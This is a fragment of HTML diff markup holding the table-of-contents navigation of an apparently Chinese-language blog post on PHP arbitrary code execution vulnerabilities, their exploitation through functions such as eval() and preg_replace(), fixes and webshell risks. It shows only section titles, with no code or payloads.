nav-level-1"><a class="nav-link" href="#0x08-pass-10"><span class="nav-number">9.</span> <span class="nav-text">0x08:pass-10</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-任意代码执行原理"><span class="nav-number">1.</span> <span class="nav-text">0x00 任意代码执行原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-代码执行漏洞的常用函数"><span class="nav-number">2.</span> <span class="nav-text">0x01 代码执行漏洞的常用函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-php漏洞分类"><span class="nav-number">3.</span> <span class="nav-text">0x02 php漏洞分类</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-任意代码执行漏洞的利用"><span class="nav-number">4.</span> <span class="nav-text">0x03 任意代码执行漏洞的利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#eval-利用1"><span class="nav-number">4.1.</span> <span class="nav-text">eval()利用1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#eval-利用2"><span class="nav-number">4.2.</span> <span class="nav-text">eval()利用2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#eval-利用3"><span class="nav-number">4.3.</span> <span class="nav-text">eval()利用3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#assert-利用"><span class="nav-number">4.4.</span> <span class="nav-text">assert()利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#preg-replace-利用"><span class="nav-number">4.5.</span> <span class="nav-text">preg_replace()利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#create-function-利用"><span class="nav-number">4.6.</span> <span class="nav-text">create_function()利用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-修复方案"><span class="nav-number">5.</span> <span class="nav-text">0x04 修复方案</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#eval"><span class="nav-number">5.1.</span> <span class="nav-text">eval()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#preg-replace"><span class="nav-number">5.2.</span> <span class="nav-text">preg_replace()</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x05-危害"><span class="nav-number">6.</span> <span class="nav-text">0x05 危害</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#一句话木马"><span class="nav-number">6.1.</span> <span class="nav-text">一句话木马</span></a></li></ol></li></ol></div>
             
 
           </div>
